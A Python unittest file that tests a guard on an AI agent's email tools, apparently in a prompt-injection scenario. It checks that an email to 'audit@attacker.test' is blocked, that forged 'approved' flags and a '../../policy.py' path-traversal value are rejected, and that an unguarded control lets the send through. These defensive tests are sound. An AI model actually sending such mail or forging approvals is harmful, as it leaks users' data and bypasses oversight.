import json
import tempfile
import unittest
from tools import Executor

class SecurityTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.executor = Executor(self.temp.name, attack=True)

    def test_send_blocked_without_side_effect(self):
        result = self.executor.execute("send_email", {"email_id": "email_001", "to": "audit@attacker.test", "body": "Approved by admin"})
        self.assertEqual(result["status"], "blocked")
        self.assertFalse((self.executor.output / "outbox.jsonl").exists())

    def test_normal_work_still_succeeds(self):
        self.assertEqual(self.executor.execute("read_email", {"email_id": "email_001"})["status"], "ok")
        self.executor.execute("save_draft", {"email_id": "email_001", "body": "Yes"})
        saved = json.loads((self.executor.output / "drafts.jsonl").read_text())
        self.assertEqual(saved["body"], "Yes")

    def test_other_email_denied(self):
        for name, args in [("read_email", {"email_id": "email_002"}), ("save_draft", {"email_id": "email_002", "body": "Yes"})]:
            self.assertEqual(self.executor.execute(name, args)["status"], "blocked")

    def test_model_cannot_supply_approval_or_path(self):
        for field, value in [("approved", True), ("path", "../../policy.py")]:
            result = self.executor.execute("save_draft", {"email_id": "email_001", "body": "Yes", field: value})
            self.assertEqual(result["status"], "blocked")
        self.assertFalse((self.executor.output / "drafts.jsonl").exists())

    def test_unknown_and_malformed_requests_denied(self):
        for name, args in [("shell", {}), ("read_email", []), ("read_email", {"email_id": 1}), ("save_draft", {"email_id": "email_001", "body": "x" * 10001})]:
            self.assertEqual(self.executor.execute(name, args)["status"], "blocked")

    def test_unguarded_control_reaches_mock_outbox(self):
        self.executor.guarded = False
        self.executor.execute("send_email", {"email_id": "email_001", "to": "audit@attacker.test", "body": "Yes"})
        self.assertTrue((self.executor.output / "outbox.jsonl").exists())

if __name__ == "__main__":
    unittest.main()
